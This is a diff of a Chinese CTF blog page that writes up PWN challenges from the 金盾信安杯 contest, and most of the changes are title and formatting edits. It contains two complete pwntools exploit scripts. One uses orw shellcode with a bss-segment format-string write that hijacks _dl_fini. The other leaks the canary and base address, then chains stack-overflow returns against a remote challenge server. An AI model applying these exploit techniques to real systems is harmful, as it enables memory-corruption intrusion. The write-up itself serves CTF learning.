@@ -21,16 +21,16 @@
   <meta name="author" content="暮夜">
   <meta name="keywords" content="">
   
-    <meta name="description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini**  源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来实">
+    <meta name="description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改exit() 执行时的 dlfiini  源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 具体：在bss段布置来实现执行she">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2024金盾信安杯_PWN">
+<meta property="og:title" content="金盾信安杯_PWN">
 <meta property="og:url" content="https://12yhy3.github.io/2024/12/02/2024-jdxa/index.html">
 <meta property="og:site_name" content="Darkness_Sword">
-<meta property="og:description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini**  源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来实">
+<meta property="og:description" content="20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改exit() 执行时的 dlfiini  源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。  分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 具体：在bss段布置来实现执行she">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://12yhy3.github.io/img/jdxa.jpg">
 <meta property="article:published_time" content="2024-12-02T00:42:00.000Z">
-<meta property="article:modified_time" content="2024-12-02T09:22:46.313Z">
+<meta property="article:modified_time" content="2024-12-02T09:28:45.090Z">
 <meta property="article:author" content="暮夜">
 <meta property="article:tag" content="&lt;span class&#x3D;&quot;label label-primary&quot;&gt;PWN&lt;&#x2F;span&gt;">
 <meta name="twitter:card" content="summary_large_image">
@@ -40,7 +40,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>2024金盾信安杯_PWN - Darkness_Sword</title>
+  <title>金盾信安杯_PWN - Darkness_Sword</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -245,7 +245,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2024金盾信安杯_PWN"></span>
+            <span id="subtitle" data-typed-text="金盾信安杯_PWN"></span>
           
         </div>
 
@@ -347,7 +347,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">2024金盾信安杯_PWN</h1>
+            <h1 id="seo-header">金盾信安杯_PWN</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -362,13 +362,13 @@
                 
                 <h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a><font style="color:rgb(36, 41, 46);">2023</font></h1><h2 id="sign-format"><a href="#sign-format" class="headerlink" title="sign-format"></a><font style="color:rgb(36, 41, 46);">sign-format</font></h2><blockquote>
 <p>题源：<font style="color:rgb(36, 41, 46);">sign-format</font></p>
-<p>考点：shellcode（&#x2F;orw）+ <font style="color:#DF2A3F;">bss段</font><strong><font style="color:#DF2A3F;">format_string</font></strong> + 篡改**<font style="color:#DF2A3F;">exit() 执行时的 dlfiini</font>**</p>
+<p>考点：shellcode（&#x2F;orw）+ <font style="color:#DF2A3F;">bss段</font><strong><font style="color:#DF2A3F;">format_string</font></strong> + 篡改<font style="color:#DF2A3F;"><strong>exit() 执行时的 dlfiini</strong></font></p>
 </blockquote>
 <h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>关闭了输出流，存在非栈上格式化字符串漏洞。</p>
 <p><img src="/images/1.png" srcset="/img/loading.gif" lazyload><br>写入地址具有可执行权限。</p>
 <p><img src="/images/2.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>**<font style="color:#DF2A3F;">思路</font>**：在bss段布置shellcode，劫持程序执行流转到输入地址。</p>
-<p>**<font style="color:#601BDE;">具体</font><strong>：在bss段布置来实现执行shellcode（orw）的跳板，之后</strong><font style="color:#DF2A3F;">修改dlfini的rsi偏移来指向orw执行的地址</font>**即可，后续程序执行到 exit() 退出时候会读出flag。</p>
+<p><strong><font style="color:#601BDE;">具体</font></strong>：<strong>在bss段布置来实现执行shellcode（orw）的跳板，之后</strong><font style="color:#DF2A3F;"><strong>修改dlfini的rsi偏移来指向orw执行的地址</strong></font>即可，后续程序执行到 exit() 退出时候会读出flag。</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>s= shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>,<span class="hljs-number">0</span>)<br>s+= shellcraft.read(<span class="hljs-number">1</span>,<span class="hljs-number">0x4040b0</span> + <span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br>s+= shellcraft.write(<span class="hljs-number">2</span>,<span class="hljs-number">0x4040b0</span> + <span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br><span class="hljs-comment">#------------------------不懂-----------------------------</span><br>p = <span class="hljs-string">b&quot;%776c%30$hn&quot;</span>   <span class="hljs-comment"># 776 = 0x308</span><br>p = p.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p += p64(<span class="hljs-number">0x4040b8</span>)<br>p += <span class="hljs-string">b&quot;\x90&quot;</span>*<span class="hljs-number">0x10</span><br><span class="hljs-comment">#-----------------------------------------------------</span><br>p += asm(s)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(p))<br>r.sendafter(<span class="hljs-string">b&quot;Let&#x27;s start!\n&quot;</span>,p)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
 <h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="⭐orange"><a href="#⭐orange" class="headerlink" title="⭐orange"></a>⭐orange</h2><blockquote>
@@ -395,7 +395,7 @@
 <p><img src="/images/5.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>首先利用第一个gets和printf泄露canary地址和程序基地址，然后加上偏移即可得到程序代码真实地址。由于存在栈溢出，并且发现flag输出函数：</p>
 <p><img src="/images/6.png" srcset="/img/loading.gif" lazyload></p>
-<p>因此只需要控制程序执行流**<font style="color:#DF2A3F;">依次给check1，check2，check3，finalcheck函数传递指定参数</font><strong>满足要求即可。</strong><font style="color:#DF2A3F;">Finalcheck函数放在最后执行即可获取shell</font><strong>。由于main函数地址已知，32位程序使用栈传递参数，而且执行流过长不易一次执行，因此</strong><font style="color:#601BDE;">依次跳转到main函数作为缓冲</font>**，一一赋值即可。</p>
+<p>因此只需要控制程序执行流<font style="color:#DF2A3F;">**依次给check1，check2，check3，finalcheck函数传递指定参数</font><strong>满足要求即可。</strong><font style="color:#DF2A3F;">Finalcheck函数放在最后执行即可获取shell</font>**。由于main函数地址已知，32位程序使用栈传递参数，而且执行流过长不易一次执行，因此<font style="color:#601BDE;">**依次跳转到main函数作为缓冲</font>**，一一赋值即可。</p>
 <p>运行结果如下：</p>
 <p><img src="/images/7.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./green&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;114.55.67.167&#x27;</span>,<span class="hljs-number">50564</span>)<br>p = io<br>elf = ELF(<span class="hljs-string">&#x27;./green&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br>offset = <span class="hljs-number">0x4</span>*<span class="hljs-number">8</span> <br>payload = <span class="hljs-string">b&#x27;%3$p-%15$p&#x27;</span>  <span class="hljs-comment"># base_addr+0x2f1 , canary_addr</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,payload)<br>base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x2f1</span><br>io.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recvline(keepends=<span class="hljs-literal">False</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base===&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(base))<br>func = <span class="hljs-number">0x342</span> + base<br>check1 = <span class="hljs-number">0x20d</span> + base<br>check2 = <span class="hljs-number">0x226</span> + base<br>check3 = <span class="hljs-number">0x23f</span> + base<br>flag = <span class="hljs-number">0x258</span> + base<br>ebx = <span class="hljs-number">0x1022</span> + base<br>main = base + <span class="hljs-number">0x365</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(check1) + p32(main) + p32(<span class="hljs-number">0x1337</span>) <br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(check2) + p32(main) + p32(<span class="hljs-number">0x420</span>) <br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>io.recvline()<br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(check3) + p32(main) + p32(<span class="hljs-number">0xDEADBEEF</span>) <br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>io.recvline()<br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(canary) + p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +  p32(flag) + p32(main)  +  p32(<span class="hljs-number">0x123</span>)  <br>p.sendlineafter(<span class="hljs-string">b&#x27;Every protection is enabled. Good luck.\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>io.recvline()<br>p.sendline(payload)<br><br>io.interactive()<br><span class="hljs-comment"># flag&#123;c6f3396244adadd3c53c49cf13ca864e&#125;</span><br></code></pre></td></tr></table></figure>
@@ -438,7 +438,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2024金盾信安杯_PWN</div>
+      <div>金盾信安杯_PWN</div>
       <div>https://12yhy3.github.io/2024/12/02/2024-jdxa/</div>
     </div>
     <div class="license-meta">
